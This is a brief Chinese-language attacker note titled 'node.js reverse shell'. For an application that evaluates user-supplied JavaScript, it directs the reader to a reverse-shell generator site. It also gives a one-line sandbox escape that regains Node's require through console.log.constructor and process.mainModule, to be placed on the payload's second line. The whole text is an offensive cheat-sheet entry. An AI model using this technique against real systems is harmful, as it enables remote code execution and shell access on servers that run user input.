# node.js反弹

存在js输入点

```bash
https://www.revshells.com/
第二行添加如下
const require = console.log.constructor('return process.mainModule.require')();
```
